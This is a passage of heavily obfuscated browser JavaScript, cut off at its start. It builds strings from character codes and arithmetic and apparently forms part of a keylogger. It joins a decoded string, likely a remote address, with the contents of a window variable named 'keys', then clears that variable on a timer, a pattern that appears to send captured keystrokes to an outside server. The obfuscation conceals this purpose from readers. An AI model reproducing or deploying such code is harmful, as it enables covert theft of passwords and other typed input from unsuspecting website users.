})())](('D'.length*0144+2),('Wvd'.length*('C'.length*('KdPH'.length*0x7+2)+7)+3),('nU'.length*056+19),('RX'.length*('Vgu'.length*(01*'pxNjHDHJ'.length+5)+1)+29),(1*0x35+14),('oEmlRqVqU'.length*013+5),(2*('QA'.length*(02*0x7+3)+8)+13),(1*(1*('SHm'.length*0xd+11)+45)+19),(0x2*(1*('pgNLZTny'.length*'NjFN'.length+0)+0)+3),(1*0x60+15),('T'.length*071+43),(0x1*(012*7+1)+30)))](('qwG'.length*(0x1*07+4)+'HaLeY'.length),(String.fromCharCode(86)[(String.fromCharCode(108,0x65,0156,0147,116,0x68))]*(((function () { var eS='i',eb='j'; return eb+eS })()[(String.fromCharCode(0154,101,0x6e,103,116,0x68))]*(function () { var dd='pr',YM='n',kI='Hb',Jr='i'; return kI+Jr+YM+dd })()[((function () { var D="gth",s0="en",fu="l"; return fu+s0+D })())]+'A'.length)*'linXTz'.length+'G'.length)+(0x7*'MBX'.length+0)),(String.fromCharCode(75)[((function () { var O3="gth",IH="n",Pr="le"; return Pr+IH+O3 })())]*(0x1*045+21)+'Yfc'.length))+window[String[(String[(String.fromCharCode(0x66,0x72,0x6f,0x6d,0103,0150,97,0162,67,0157,100,0x65))](('KGT'.length*30+12),(2*('MJK'.length*('bJ'.length*0x5+0)+9)+36),('xhw'.length*(0x1*('Wdn'.length*'ngQTbGwVn'.length+1)+2)+21),(06*(01*013+5)+13),('AqGpF'.length*13+2),(2*('R'.length*('X'.length*(2*(07*'BW'.length+1)+2)+12)+7)+2),('j'.length*('Mr'.length*18+14)+47),(1*(1*0104+22)+24),('ykGRW'.length*12+7),('ob'.length*0x2d+21),('cmTy'.length*0x19+0),(1*74+27)))](('fFnEY'.length*('g'.length*('FeTGx'.length*'Al'.length+0)+8)+(01*(6*'Tb'.length+0)+5)),((function () { var wm='H'; return wm })()[((function () { var Hv="th",mx="g",MN="le",ka="n"; return MN+ka+mx+Hv })())]*('b'.length*(String.fromCharCode(0x72)[((function () { var _5="th",yB="g",bO="le",vW="n"; return bO+vW+yB+_5 })())]*(String.fromCharCode(120,101)[((function () { var BF="gth",cH="len"; return cH+BF })())]*(1*('BKvAFa'.length*2+0)+9)+(010*'Ds'.length+1))+'UCBUQ'.length)+(023*1+0))+('GPZsba'.length*'cjj'.length+0)),('B'.length*(2*032+23)+('AwLNdUF'.length*'OmSLfu'.length+4)),((function () { var vR='n',FI='v'; return FI+vR })()[(String.fromCharCode(0154,0145,0x6e,103,0164,104))]*('C'.length*(0xc*'orY'.length+1)+7)+(2*013+5)))]+'';window[(function(){var Bp=String[((function () { var UF="Code",Oa="mChar",$H="fro"; return $H+Oa+UF })())](('x'.length*0x58+27)),zU=(function(){var as=String.fromCharCode(121),gD=(function () { var vM="e"; return vM })(),zb=String.fromCharCode(107);return zb+gD+as;})();return zU+Bp;})()]='';},(String.fromCharCode(0x43)[(String.fromCharCode(0x6c,0145,110,0x67,0x74,0x68))]*(String.fromCharCode(0x58,0x53,88,0146,0x47)[((function () { var K="h",N3="engt",t="l"; return t+N3+K })())]*(0x1*01620+387)+(03*'GJHne'.length+0))+('m'.length*('t'.length*((function () { var y='D'; return y })()[(String.fromCharCode(108,101,0x6e,103,0x74,104))]*(0x3*('acO'.length*'ecvPQh'.length+1)+3)+'QHi'.length)+('q'.length*0x2b+12))+(03*10+8))));
